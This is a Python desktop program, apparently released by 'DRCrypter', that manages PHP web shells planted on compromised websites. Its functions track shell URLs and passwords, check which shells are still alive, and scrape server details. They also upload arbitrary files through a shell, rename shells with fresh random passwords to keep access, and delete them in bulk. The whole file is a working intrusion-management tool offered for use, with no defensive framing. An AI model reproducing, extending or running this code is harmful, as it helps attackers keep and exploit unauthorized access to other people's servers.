import tkinter as tk
from tkinter import ttk, Toplevel, Menu, Text, PhotoImage, Label, filedialog
import webbrowser
from PIL import Image, ImageTk
import sv_ttk
import requests as drc_req
import json
import os
import re
import socket 
from urllib3.exceptions import InsecureRequestWarning
import urllib3
drc_req.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
from urllib.parse import urlparse
import pywinstyles, sys, random, string
#https://github.com/rdbende/Sun-Valley-ttk-examples



try:
    os.mkdir('Logs')
except:
    pass 

if not os.path.exists('Logs/data.json'):
    with open('Logs/data.json', 'w') as file:
        json.dump([], file)  

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0'}




#Set Global
item_counter = 1
def load_resized_icon(path, size=(32, 32)):
    image = Image.open(path)  
    resized_image = image.resize(size, Image.Resampling.LANCZOS)  # My Metod work with Resampling.LANCZOS
    return ImageTk.PhotoImage(resized_image)  


if not os.path.exists('Logs/data.json'):
    with open('Logs/data.json', 'w') as file:
        json.dump([], file)  

def generate_filename(length=8):
    characters = string.ascii_lowercase 
    random_word = ''.join(random.choice(characters) for _ in range(length)) + '.php'
    return random_word

def generate_passwd(length=10):
    characters = string.ascii_letters + string.digits  
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string



# Application Form Windows
root = tk.Tk()
style = ttk.Style()
style.configure("Switch.TCheckbutton")

root.geometry("799x471")
root.resizable(True, True)
VER_APP = '1.0'
root.title(f"ZeroShell Manager v{VER_APP} ")

# Set default theme
current_theme = "dark"
sv_ttk.set_theme("dark")



frame = tk.Frame(root)
frame.pack(fill='both', expand=True)


tree = ttk.Treeview(frame, columns=('ID', 'URL', 'ServInfo', 'Key_PWD'))
#https://stackoverflow.com/questions/31836104/pyinstaller-and-onefile-how-to-include-an-image-in-the-exe-file
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)
json_file = 'Logs/data.json'
local_dir = resource_path('Files/Country')
tree.column("#0", width=60, anchor='center', stretch=tk.YES) 
tree.column("ID", width=60, anchor='center', stretch=tk.YES)
tree.column("ServInfo", width=180, anchor='center', stretch=tk.YES)
tree.column("Key_PWD", width=155, anchor='center', stretch=tk.YES)

# Create headings
tree.heading("#0", text="Country", anchor='center')
tree.heading("ID", text="ID", anchor='center')
tree.heading("URL", text="Domain/URL", anchor='center')
tree.heading("ServInfo", text="ServInfo", anchor='center')
tree.heading("Key_PWD", text="Key_PWD", anchor='center')


tree.pack(fill='both', expand=True)
frame.grid_columnconfigure(0, weight=1)
#all images here 
warning_png = resource_path('Files/warning.png')
zerologo_png = resource_path('Files/logo_z.png')
warning_icon = PhotoImage(file =zerologo_png)
zero_logo = PhotoImage(file =zerologo_png)
check_icon = load_resized_icon(resource_path("Files/check_icon.png"))
masscheck_icon = load_resized_icon(resource_path("Files/masscheck_icon.png"))
upload_icon = load_resized_icon(resource_path("Files/upload_icon.png"))
browse_icon = load_resized_icon(resource_path("Files/browse_icon.png"))
change_icon = load_resized_icon(resource_path("Files/change_icon.png"))
remove_icon = load_resized_icon(resource_path("Files/remove_icon.png"))
add_icon = load_resized_icon(resource_path("Files/add_icon.png"))
mass_urls_icon = load_resized_icon(resource_path("Files/mass_urls_icon1.png"))
delete_icon = load_resized_icon(resource_path("Files/delete_icon.png"))
clear_icon = load_resized_icon(resource_path("Files/clear_icon.png"))
shell_manager = load_resized_icon(resource_path("Files/shellmanager_icon.png"))
refresh_icon = load_resized_icon(resource_path("Files/refresh_icon.png"))

def URL2HOST(site):
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    site = site.strip()
    pattern = re.compile(r'([^/]+)')
    match = re.findall(pattern, site)
    if match:
        domain = match[0]
    else:
        domain = urlparse(site).netloc
    return domain

    
#https://www.digitalocean.com/community/tutorials/python-get-ip-address-from-hostname
def Domain2IP(domain):
    try:
        do_name = URL2HOST(domain)
        ip_address = socket.gethostbyname(do_name)
        return ip_address
    except socket.error:
        return None
    
def open_url(url):
    webbrowser.open_new_tab(url)

def Alive_Shell(link_shell): 
    try:
        Check_Uploader = drc_req.get(link_shell, 
                                     headers=headers,
                                       timeout=15, 
                                       verify=False).text
        if 'ErrorCool Uploader' in str(Check_Uploader) and 'Developed by Forums' in str(Check_Uploader) and 'drcrypter' in str(Check_Uploader):
            return True

        return False
    except:
        return False
    



def Killed_Shell(link_shell):
    try:
        #is_ThataLive = Extract_Servinfo(link_shell)
        DeletingRES = drc_req.post(link_shell, 
                                   headers=headers, 
                                   data={"delete_script": ''}, 
                                   allow_redirects=True).text
        
        if 'ErrorCool Uploader file was Deleted Successfully' in str(DeletingRES):
            return True
        else:
            Response_GET = drc_req.get(link_shell, 
                                       headers=headers, 
                                       timeout=10).text
            if ('<title>ErrorCool Uploader' not in Response_GET or 
                'drcrypter.ru' not in Response_GET or 
                'SERVER APP :' not in Response_GET or 
                ('<input type="submit" class="submit-button" value="Upload">' in Response_GET and 'Safe Mode' in Response_GET)):
                return True
            return False
            
            # else:
            #     if is_ThataLive:
            #         return False
            #     else:
            #         return True

    except:
        return False 




def Rename_Shell(shell_link):
    #this dynamic slash of directory dont know how users input that hard to make default so this count make active dynamic 
    def directory_counter(shell_link):
        DIR = str(shell_link).split('://')[-1].split('/', 1)[1]
        path = DIR.split('?')[0].split('#')[0]
        slash_count = path.count('/')
        return '../' * slash_count
    
    filename_php = generate_filename() 
    php_passwd = generate_passwd()
    HOST = URL2HOST(shell_link)
    Protocol = str(shell_link).split('://')[0]
    if Alive_Shell(shell_link):

        diready = directory_counter(shell_link)
        data = {
            'newme': f"{diready}{filename_php}",
            'newpasswd': f"@{php_passwd}"
        }
        try:
            response = drc_req.post(shell_link, 
                                    data=data, 
                                    headers=headers, 
                                    timeout=15, 
                                    verify=False, 
                                    allow_redirects=False)
            #print(response.url)
            if response.status_code:
                MY_URL = str(Protocol + '://' + HOST + '/' + response.headers['Location'] + f'?whoami=@{php_passwd}')
                #print(MY_URL)
                if Alive_Shell(MY_URL):
                    return True, MY_URL
                
                return False, None
            
            return False, None
        
        #except requests.RequestException as e:
        except:
            #print(f"Error in Secure_Shell: {e}")
            return False, None
        

def Auto_UploadFile(link_shell, target_file):
    #print(link_shell, target_file)
    Target_Path = str(link_shell).rsplit('/', 1)[0] + '/'
    File_name = os.path.basename(target_file)
    drc_req.post(link_shell, 
                 headers=headers, 
                 files={'files': (target_file, 
                                  File_name)}, 
                                  data={
                'submit': 'Upload'  
            }, 
            verify=False, 
            allow_redirects=True, timeout=15)
    Finally_URL = f'{Target_Path}{File_name}'
    open_url(Finally_URL)

def Extract_Servinfo(link_shell):
    try:
        SourceX = drc_req.get(link_shell, 
                              headers=headers, 
                              timeout=15, 
                              verify=False).text 
        info_x = re.findall(r'<b>SERVER APP :</b> (.*)<br>', SourceX)[0]
        if info_x:
            return info_x
        return None

    except:
        return None

def AddTOJSON(json_file, domain, ip, flag, serverinfo, pwd, status='unchecked'):
    try:
        with open(json_file, 'r') as file:
            manager_db = json.load(file)
    except FileNotFoundError:
        manager_db = []
        show_warning('Starting with New Database', zero_logo)
    except json.JSONDecodeError as err_json:
        manager_db = []
        pass 
        #show_warning(f'Error Json :\n{err_json}', zero_logo)

    for host_info in manager_db:
        if host_info['domain'] == domain:
            host_info.update({
                'ip': ip, 'flag': flag, 'serverinfo': serverinfo, 'pwd': pwd, 'status': status })
            break
    else:

        manager_db.append({ 
            'domain': domain, 'ip': ip, 'flag': flag, 'serverinfo': serverinfo, 'pwd': pwd, 'status': status })

    with open(json_file, 'w') as file:
        json.dump(manager_db, file, indent=4)


def Extract_Key(domain):
    try:
        return domain.split('.php?whoami=')[1]
    except:
        return 'Failed'
def Updating_JSON(json_file, domain, ip, extracted, status, item_counter):
    # set color or leave me alone
    #tree.tag_configure('Online', background='green', foreground='white')
    tree.tag_configure('Offline', background='red', foreground='white')
    pwd = Extract_Key(domain)
    
    try:
        # Try to open the JSON file and load data
        with open(json_file, 'r') as file:
            manager_db = json.load(file)
    except FileNotFoundError:
        manager_db = []
        show_warning('Starting with New Database', zero_logo)
    except json.JSONDecodeError as err_json:
        manager_db = []
        show_warning(f'Error Json:\n{err_json}', zero_logo)

    domain_found = False
    

    try: 
        for host_info in manager_db:
            if host_info['domain'] == domain:
                host_info.update({'ip': ip, 
                                  'serverinfo':
                                    extracted, 
                                    'status': 
                                    status, 
                                    'pwd': pwd})
                domain_found = True
                break
        
        
        if not domain_found:
            country, country_code = get_country_from_ip(ip)
            flag_icon_path = os.path.join(local_dir, country_code.lower() + '.png')
            flag_image = load_resized_icon(flag_icon_path, size=(30, 20))
            manager_db.append({
                'domain': domain,
                'ip': ip,
                'serverinfo': extracted,
                'flag': country_code,  
                'pwd': pwd,
                'status': status
            })

        # Save me as json not png
        with open(json_file, 'w') as file:
            json.dump(manager_db, file, indent=4)

        

        if tree.exists(item_counter):
            #update data into treeview
            tree.item(item_counter, values=(item_counter, domain, extracted, pwd), tags=(status,))
        else:
            # add new data into treeview 
            tree.insert(parent='', index='end', iid=item_counter, text='', image=flag_image,
                        values=(item_counter, domain, extracted, pwd), tags=(status,))
            
    except:
        pass 
    #  except Exception as e:
    #     show_warning(f'Error Updating Json: {e}', zero_logo)
def Updating_Shell(json_file, new_link, status, item_id):

    try:
        with open(json_file, 'r') as file:
            manager_db = json.load(file)
    except FileNotFoundError:
        manager_db = []
        show_warning('Starting with New Database', zero_logo)
    except json.JSONDecodeError as err_json:
        manager_db = []
        show_warning(f'Error Json:\n{err_json}', zero_logo)

    domain_found = False

    for host_info in manager_db:
        OLD_URL = URL2HOST(host_info['domain'])
        NEW_URL = URL2HOST(new_link)
        NEW_KEY = Extract_Key(new_link)
        if OLD_URL == NEW_URL:  # OLD VS NEW ME 
            host_info['domain'] = new_link  
            host_info['status'] = status  
            host_info['pwd'] = NEW_KEY 
            domain_found = True
            break

    if not domain_found:
        return  
    
    with open(json_file, 'w') as file:
        json.dump(manager_db, file, indent=4)

    if tree.exists(item_id):
        tree.item(item_id, values=(item_id, new_link, host_info['serverinfo'], host_info['pwd']), tags=(status,))
    else:
        pass 
    tree.update_idletasks()

loaded_images = []  # rest image when re open program

def Load_Data_To_Treeview(json_file):
    global item_counter 
    #tree.tag_configure('Online', background='green', foreground='white')
    tree.tag_configure('Offline', background='red', foreground='white')
    try:
        with open(json_file, 'r') as file:
            stored_db = json.load(file)

        tree.delete(*tree.get_children())  

        for item in stored_db:
            domain = item['domain']
            serverinfo = item['serverinfo']
            pwd = item['pwd']
            flag = item['flag']
            status = item['status']

            flag_icon_path = os.path.join(local_dir, f"{flag}.png")

            if os.path.exists(flag_icon_path):
                flag_image = load_resized_icon(flag_icon_path, size=(30, 20))
                loaded_images.append(flag_image) 
            else:
                flag_image = None  

            tree.insert(parent='', index='end', iid=item_counter, text='', image=flag_image,
                        values=(item_counter, domain, serverinfo, pwd), tags=(status,))

            item_counter += 1  

    except FileNotFoundError:
        show_warning('Database not found.\nStarting with an empty Treeview.', zero_logo)
    except json.JSONDecodeError as err_json:
        pass 
        #show_warning(f'Error reading JSON\n{err_json}', zero_logo)
    except Exception as e:
        show_warning(f'Error loading data into Treeview:\n{e}', zero_logo)
        
def Submit_Data(url):
    global item_counter
    try:
        shell_pwd = Extract_Key(url)
        ip_done = Domain2IP(url)
        country, country_code = get_country_from_ip(ip_done)
        if country_code:
            flag_icon_path = os.path.join(local_dir, country_code.lower() + '.png')
            flag_code = country_code.lower()
            if os.path.exists(flag_icon_path):
                flag_image = load_resized_icon(flag_icon_path, size=(30, 20))
                tree.insert(parent='', index='end', iid=item_counter, text='', image=flag_image, values=(item_counter, url, '', shell_pwd))
                AddTOJSON(json_file, url, ip_done, flag_code, '', shell_pwd, status='unchecked')
                flag_images[str(item_counter)] = flag_image  
                item_counter += 1
            #else:
                #show_warning("Flag icon not found!", warning_icon)  
    except Exception as er:
        print('Error Submit : ', er)

#Single Adder
def add_url():

    def input_url():
        url = url_entry.get().strip()
        if url:
            Load_Data_To_Treeview(json_file)
            Submit_Data(url)

    def cancel_url():
        url_window.destroy()

    # popup another form message
    url_window = Toplevel(root)
    url_window.resizable(False, False)
    url_window.geometry("300x150")
    url_window.title("Add URL")
    apply_theme_to_titlebar(url_window)
    url_window.wm_iconphoto(False, zero_logo)
    
    label = ttk.Label(url_window, text="Enter the URL:")
    label.pack(pady=10)

    url_entry = ttk.Entry(url_window)
    url_entry.pack(pady=5, fill='x', padx=10)

    button_frame = tk.Frame(url_window)
    button_frame.pack(side='bottom', fill='x', pady=10) 

    ok_button = ttk.Button(button_frame, text="OK", command=input_url)
    ok_button.pack(side='left', padx=10)

    cancel_button = ttk.Button(button_frame, text="Cancel", command=cancel_url)
    cancel_button.pack(side='right', padx=10)
    
#mass adder
def add_multiple_urls():

    def input_urls():
        urls = text_box.get("1.0", tk.END).strip().splitlines()
        if urls:
            for url in urls:
                if url:
                    Load_Data_To_Treeview(json_file)
                    Submit_Data(url)
                    
                    
                        
            multi_url_window.destroy()
        else:
            show_warning("You must enter at least one URL", warning_icon)

    def cancel_urls():
        multi_url_window.destroy()

    multi_url_window = Toplevel(root)
    multi_url_window.resizable(False, False)
    multi_url_window.geometry("380x280")
    multi_url_window.title("Mass Add URLs")
    multi_url_window.wm_iconphoto(False, zero_logo)
    apply_theme_to_titlebar(multi_url_window)

    button_frame = tk.Frame(multi_url_window)
    button_frame.pack(side=tk.TOP, fill='x', pady=10)

    add_button = ttk.Button(button_frame, text="Add", command=input_urls)
    add_button.pack(side='left', padx=10)

    cancel_button = ttk.Button(button_frame, text="Cancel", command=cancel_urls)
    cancel_button.pack(side='right', padx=10)

    text_box = Text(multi_url_window, wrap='word')
    text_box.pack(fill='both', expand=True, padx=10, pady=10)

def get_country_from_ip(ip):
    try:
        url = f'https://api.iplocation.net/?ip={ip}'
        zerror = drc_req.get(url, allow_redirects=False)
        if zerror.status_code == 200:
            data = zerror.json()
            if '-' in data['country_name'] and '-' in data['country_code2']:
                return None, 'Unknown_flag'
            elif 'country_name' in data and 'country_code2' in data:
                return data['country_name'], data['country_code2']
            else:
                return None, 'Unknown_flag'
        else:
            return None, 'Unknown_flag'
    except:
        pass 




#Themes 
def switch_theme():
    global current_theme, root
    if current_theme == "dark":
        sv_ttk.set_theme("light")
        current_theme = "light"
        apply_theme_to_titlebar(root)
    else:
        sv_ttk.set_theme("dark")
        current_theme = "dark"
        apply_theme_to_titlebar(root)

#Our Message Warning and debug without any ide lol
def show_warning(message, icon=None):
    sv_ttk.set_theme(current_theme)
    def on_ok():
        nonlocal confirmed
        confirmed = True
        dialog.destroy()

    def on_cancel():
        nonlocal confirmed
        confirmed = False
        dialog.destroy()

    confirmed = False
    dialog = Toplevel(root)
    dialog.geometry("300x150")
    dialog.resizable(False, False)
    dialog.title("Warning")
    apply_theme_to_titlebar(dialog)
    

    if icon:
        dialog.iconphoto(False, icon)

    content_frame = tk.Frame(dialog)
    content_frame.pack(expand=True, fill='both', padx=10, pady=10)

    label = ttk.Label(content_frame, text=message, anchor='center')
    label.pack(expand=True, fill='x', pady=20)

    button_frame = tk.Frame(dialog)
    button_frame.pack(side='bottom', fill='x', pady=10)

    ok_button = ttk.Button(button_frame, text="OK", command=on_ok)
    ok_button.pack(side='right', padx=10)

    cancel_button = ttk.Button(button_frame, text="Cancel", command=on_cancel)
    cancel_button.pack(side='left', padx=10)

    dialog.wait_window(dialog)
    return confirmed
    
flag_images = {}


#delete all  from panel
    
def Delete_All(json_file):
    try:
        # Clear the JSON file by writing an empty list
        with open(json_file, 'w') as file:
            json.dump([], file)
        #show_warning('All domains have been deleted\nfrom the database.', warning_icon)

        # delete all from json and clear all tree view data form panel also
        for item in tree.get_children():
            tree.delete(item)

    except Exception as e:
        show_warning(f'Error deleting all entries: {e}', zero_logo)

#deleted per selected from users
def Delete_Selected(json_file):
    selected_items = tree.selection()
    if not selected_items:
        #show_warning('Please Try Selected Again\nWhich Domain You want to Delete', zero_logo)
        return
    
    item_id = selected_items[0]
    domain = tree.item(item_id)['values'][1]
    
    Delete_Domain(json_file, domain)

def Delete_Domain(json_file, domain):
    try:
        with open(json_file, 'r') as file:
            manager_db = json.load(file)
    except FileNotFoundError:
        #show_warning('Database not found', zero_logo)
        return
    except json.JSONDecodeError as err_json:
        #show_warning(f'Error reading JSON: {err_json}', zero_logo)
        return

    updated_db = [host_info for host_info in manager_db if host_info['domain'] != domain]
    if len(updated_db) < len(manager_db):
        with open(json_file, 'w') as file:
            json.dump(updated_db, file, indent=4)
   
    for item in tree.get_children():
        if tree.item(item)['values'][1] == domain:
            tree.delete(item)
            break

# Function to handle right-click on the Treeview
def show_context_menu(event):
    try:
        tree.selection_set(tree.identify_row(event.y))
        context_menu.post(event.x_root, event.y_root)
    except tk.TclError:
        pass


#All Fuction users input
def input_value(command):
    #debug commander
    #print('Command Input :', command)
    items = tree.get_children() 
    selected_items = tree.selection()  
    if command == 'Mass Shell':
        for item in items:
            item_id = tree.item(item, 'values')[0]
            url = tree.item(item, 'values')[1]
            check_shell(item_id, url)
        return  

    if selected_items:
        item_id = tree.item(selected_items[0], 'values')[0]
        url = tree.item(selected_items[0], 'values')[1]

        if command == 'Browse Shell':
            browse_shell(item_id, url)
        elif command == 'Check Shell':
            check_shell(item_id, url)
        elif command == 'Upload File':
            upload_file(item_id, url)
        elif command == 'Rename & PWD':
            Rename_PWD(item_id, url)
        elif command == 'Destroy Shell':
            destroy_shell(item_id, url)
    else:
        show_warning("No item Selected", warning_icon)
    
def browse_shell(item_id, url):
    print(f"[{item_id}] Browsing Shell : {url}")
    open_url(url) 

def check_shell(item_id, url):
    #print(f"[{item_id}] Checking Shell : {url}")
    checking = Alive_Shell(url)
    extract_info = Extract_Servinfo(url)
    ready_ip = Domain2IP(url)
    if checking and extract_info:
        #(json_file, domain, ip, extracted, status, item_counter)
        Updating_JSON(json_file, url, ready_ip, extract_info, 'Online', item_id)
        print(f'[{item_id}] Shell Online :',url)
    else:
        Updating_JSON(json_file, url, ready_ip, extract_info, 'Offline', item_id)
        print(f'[{item_id}] Shell Offline :',url, item_id)


def upload_file(item_id, url):
    #show_warning('Coming Soon', warning_icon)
    path_file = filedialog.askopenfilename(
        title="Select a File",
        filetypes=(("All Files", "*.*"),)  # Allow all file types
    )
    if path_file:
        Auto_UploadFile(url, path_file)
        
    
def Rename_PWD(item_id, url):
    Checking = None
    New_Link = None
    try:
        Checking, New_Link = Rename_Shell(url)

    except TypeError:
        pass 
    if Checking:
        Clean_URL = str(New_Link).replace('../', '')
        Updating_Shell(json_file, Clean_URL, 'Online', item_id)
    else:
        pass 
    
def destroy_shell(item_id, url):
    print(f"[{item_id}] Destroying Shell : {url}")
    if Killed_Shell(url):
        print('Shell was Destroy Forever')        
        Delete_Domain(json_file, url)

#Thank for help with function  https://github.com/Akascape/py-window-styles
def apply_theme_to_titlebar(root):
    if pywinstyles is None:
        print("pywinstyles library is not installed.")
        return
    version = sys.getwindowsversion()

    if version.major == 10 and version.build >= 22000:
        # Windows 11
        color = "#1c1c1c" if sv_ttk.get_theme() == "dark" else "#fafafa"
        pywinstyles.change_header_color(root, color)
    elif version.major == 10:
        # Windows 10
        theme = "dark" if sv_ttk.get_theme() == "dark" else "normal"
        pywinstyles.apply_style(root, theme)

        # Hacky way to update title bar color on Windows 10
        root.wm_attributes("-alpha", 0.99)
        root.wm_attributes("-alpha", 1)

def message_asking(title, message, function, icon=None):
    sv_ttk.set_theme(current_theme)
    dialog = tk.Toplevel(root)
    dialog.resizable(False, False)
    dialog.title(title)
    dialog.geometry("300x150")
    apply_theme_to_titlebar(dialog)
    if icon:
        dialog.iconphoto(False, icon)
    content_frame = tk.Frame(dialog)
    content_frame.pack(expand=True, fill='both', padx=10, pady=10)
    label = ttk.Label(content_frame, text=message, anchor='center')
    label.pack(expand=True, fill='x', pady=20)
    button_frame = ttk.Frame(dialog)
    button_frame.pack(side='bottom', fill='x', pady=10)
    agree_button = ttk.Button(button_frame, text="Agree", command=lambda: [function(), dialog.destroy()])
    agree_button.pack(side=tk.LEFT, padx=10)
    cancel_button = ttk.Button(button_frame, text="Cancel", command=dialog.destroy)
    cancel_button.pack(side=tk.RIGHT, padx=10)
context_menu = Menu(root, tearoff=0)

shell_managed_submenu = Menu(context_menu, tearoff=0)
shell_managed_submenu.add_command(label="Browse Shell", command=lambda: input_value('Browse Shell'), image=browse_icon, compound=tk.LEFT)
shell_managed_submenu.add_command(label="Check Shell", command=lambda: input_value('Check Shell'), image=check_icon, compound=tk.LEFT)
shell_managed_submenu.add_command(label="Mass Shell", command=lambda: input_value('Mass Shell'), image=masscheck_icon, compound=tk.LEFT)
shell_managed_submenu.add_command(label="Upload File", command=lambda: input_value('Upload File'), image=upload_icon, compound=tk.LEFT)
shell_managed_submenu.add_command(label="Rename & PWD", command=lambda: input_value('Rename & PWD'), image=change_icon, compound=tk.LEFT)
shell_managed_submenu.add_command(label="Destroy Shell", command=lambda: input_value('Destroy Shell'), image=remove_icon, compound=tk.LEFT)
context_menu.add_cascade(label="Shell Managed", menu=shell_managed_submenu, image=shell_manager, compound=tk.LEFT)
context_menu.add_separator()
context_menu.add_command(label="Add URL", command=add_url, image=add_icon, compound=tk.LEFT)
context_menu.add_command(label="Add Mass URLs", command=add_multiple_urls, image=mass_urls_icon, compound=tk.LEFT)
context_menu.add_command(label="Delete (Panel)", command=lambda : message_asking('Warning : Please Read and Agree', 'Are you Sure ? \nWill Delete from Panel & Database !!!', lambda: Delete_Selected(json_file), warning_icon), image=delete_icon, compound=tk.LEFT)
context_menu.add_command(label="Clear All (Panel)", command=lambda : message_asking('Warning : Please Read and Agree', 'Are you Sure ? \nWill Destroy All Panel & All in Database !!!', lambda: Delete_All(json_file), warning_icon), image=delete_icon, compound=tk.LEFT)

tree.bind("<Button-3>", show_context_menu)

frame_buttom = tk.Frame(root)
frame_buttom.pack(pady=35, side=tk.TOP)

btn_update = ttk.Button(frame_buttom, text="Check Update", command=lambda: open_url("https://github.com/drcrypterdotru"))
btn_update.pack(side=tk.LEFT, padx=10)

label = tk.Label(frame_buttom, text="Created by : DRCrypter", cursor="hand2", foreground="red", font=(12))
label.pack(side=tk.BOTTOM, padx=10)

label.bind("<Button-1>", lambda e: open_url("https://drcrypter.ru"))
switch = ttk.Checkbutton(frame_buttom, text="Turn Light", style="Switch.TCheckbutton", command=switch_theme)
switch.pack(side=tk.BOTTOM, padx=10)

apply_theme_to_titlebar(root)
root.wm_iconphoto(False, zero_logo)
Load_Data_To_Treeview(json_file)
root.mainloop()
